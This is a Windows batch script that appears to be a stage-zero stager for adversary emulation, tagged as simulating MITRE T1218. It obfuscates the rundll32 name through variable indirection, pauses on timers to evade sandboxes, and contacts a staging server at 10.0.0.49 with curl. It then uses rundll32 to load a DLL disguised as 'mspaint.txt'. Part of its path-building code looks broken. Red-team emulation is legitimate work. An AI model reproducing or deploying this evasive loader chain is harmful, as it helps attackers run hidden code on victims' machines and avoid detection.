@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET yktnwwf=%APPDATA%\7984\fce4da97
SET fpakbq=Macula-Stage0-7984
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7984-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=mspaint.txt
SET fpldhe=7984

REM Obfuscated LOLBIN references using variable indirection
SET gtsf=Run
SET qmmwk=dll32
SET lqtf=.exe
SET vbnhy=gtsf
SET kliop=qmmwk
SET hjuty=lqtf
SET jkmny=WINDIR
SET cbnvm=System32
SET dqwxy=%\
SET werty=%
SET tyuio=%\
SET uiopa=%\
SET zxcvb=cmd
SET asdfg=/c
SET qwert=curl
SET yuiop=-k
SET ghjkl=-s
SET bnmlp=-o
SET vcxza=nul

REM Log file setup
SET lvjuf=%APPDATA%\!yydue!\!edjwtl!
SET hgfds=macula-simulations.log
SET poiuyt=!lvjuf!\!hgfds!

REM Debug logging function (always executes)
SET dbgvar=echo [%DATE% %TIME%][DEBUG][!omxgazu!]:
SET dbgtgt=>> "!poiuyt!" 2>nul

REM Initial delay 45 seconds
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start=45s !dbgtgt!
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete !dbgtgt!

REM Build and resolve indirect LOLBIN references
SET cmdpart1=!gtsf!
SET cmdpart2=!qmmwk!
SET cmdpart3=!lqtf!
CALL SET binpart1=%%!cmdpart1!%%
CALL SET binpart2=%%!cmdpart2!%%
CALL SET binpart3=%%!cmdpart3!%%
SET lolbin=!binpart1!!binpart2!!binpart3!

REM Build full path using variable arrays
SET part[0]=!!
SET part[1]=!jkmny!
SET part[2]=!!
SET part[3]=!cbnvm!
SET part[4]=!!
SET part[5]=!lolbin!

SETLOCAL DisableDelayedExpansion
FOR /L %%i IN (0,1,5) DO (
    SET index=%%i
    SETLOCAL EnableDelayedExpansion
    CALL SET val=%%part[!index!]%%
    ENDLOCAL
    SET part!index!=!val!
)
SETLOCAL EnableDelayedExpansion

SET pathbuild=
FOR /L %%i IN (0,1,5) DO (
    SET index=%%i
    SETLOCAL EnableDelayedExpansion
    CALL SET chunk=%%part!index!%%
    ENDLOCAL
    CALL SET pathbuild=%%pathbuild%%%%chunk%%
)

SET fullbin=!pathbuild!

REM Delay 10 seconds between operations
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: op_delay_start=10s !dbgtgt!
ping -n 10 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: op_delay_complete !dbgtgt!

REM Heartbeat check with obfuscated curl command
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_start=!rdzgrnne! !dbgtgt!
SET curlcmd=!qwert! !yuiop! !ghjkl! !bnmlp! !vcxza! !rdzgrnne!
!dbgvar! heartbeat_command=!curlcmd! !dbgtgt!
%curlcmd%
IF !ERRORLEVEL! EQU 0 (
    SET hbres=1
    SET hberr=
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_success !dbgtgt!
) ELSE (
    SET hbres=0
    SET hberr=connection_failed
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_failed !dbgtgt!
)

REM TTP logging for T1218
SET ttp_id=T1218
SET ttp_name=Signed Binary Proxy Execution
SET ttplog=[%DATE% %TIME%][!omxgazu!]: !yydue!-!fpldhe!-!ttp_id!|!ttp_name!=!hbres!:!hberr!
(echo !ttplog!) >> "!poiuyt!" 2>nul || rem

REM Random delay 10-30 seconds
SET /A randdel=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start=!randdel!s !dbgtgt!
timeout /t !randdel! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete !dbgtgt!

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start=!yktnwwf! !dbgtgt!
cd /d "!yktnwwf!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_success !dbgtgt!
    SET cdres=1
    SET cderr=
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_failed !dbgtgt!
    SET cdres=0
    SET cderr=access_denied
)

REM Build DLL load command using string substitution
SET loadpart1=!edjwtl!
SET loadpart2=,
SET loadpart3=DllMain
SET loadcmd=!loadpart1!!loadpart2!!loadpart3!
SET fullcmd="!fullbin!" !loadcmd!

REM Delay before execution
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_exec_delay_start=15s !dbgtgt!
CHOICE /C Y /N /D Y /T 15 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_exec_delay_complete !dbgtgt!

REM Execute DLL with indirect variable reference
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_start=!loadcmd! !dbgtgt!
%fullcmd%
IF !ERRORLEVEL! EQU 0 (
    SET execres=1
    SET execerr=
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_success !dbgtgt!
) ELSE (
    SET execres=0
    SET execerr=load_failed
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_failed !dbgtgt!
)

REM Final TTP logging for execution
SET ttplog2=[%DATE% %TIME%][!omxgazu!]: !yydue!-!fpldhe!-!ttp_id!|!ttp_name!=!execres!:!execerr!
(echo !ttplog2!) >> "!poiuyt!" 2>nul || rem

REM Cleanup delay
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: cleanup_delay_start=8s !dbgtgt!
ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_complete !dbgtgt!

ENDLOCAL
EXIT /B 0